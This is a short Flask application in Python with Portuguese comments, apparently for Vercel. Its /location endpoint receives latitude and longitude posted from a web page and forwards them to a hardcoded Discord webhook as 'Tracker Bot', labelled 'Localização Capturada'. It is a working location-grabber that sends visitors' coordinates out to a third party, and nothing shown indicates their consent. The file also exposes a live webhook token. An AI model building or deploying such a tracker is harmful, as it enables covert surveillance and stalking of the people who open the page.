from flask import Flask, render_template, request, jsonify
import requests  # Importação corrigida

app = Flask(__name__, template_folder="templates")  # Ajuste do caminho

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/location", methods=["POST"])
def get_location():

    def discord_info(lat, long):
        WEBHOOK_URL = "https://discord.com/api/webhooks/1354421955381690459/0UT5Cd21QsmdpEEoa3FhD0JEfj27HDNMUmy_UhNeHlbc7V8SMOGxzwDDT6Gatj3qc3Bn"

        embed = {
            "title": "Localização Capturada",
            "description": f"Latitude: {lat}, Longitude: {long}",
            "color": 16711680,
            "footer": {"text": "Dados coletados"},
        }

        data = {
            "content": f"📍 Nova localização recebida!\nLatitude: {lat}\nLongitude: {long}",
            "username": "Tracker Bot",
            "embeds": [embed],
        }

        response = requests.post(WEBHOOK_URL, json=data)

        if response.status_code == 204:
            print("Mensagem enviada com sucesso!")
        else:
            print(f"Erro ao enviar mensagem: {response.status_code} - {response.text}")

    try:
        data = request.json
        latitude = data.get("latitude")
        longitude = data.get("longitude")

        if latitude and longitude:
            print(f"📍 Localização recebida: {latitude}, {longitude}")
            discord_info(latitude, longitude)
            return jsonify({"status": "success", "message": "Localização recebida!"}), 200
        else:
            return jsonify({"status": "error", "message": "Dados inválidos!"}), 400
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# Vercel exige que o app seja renomeado para 'handler'
handler = app
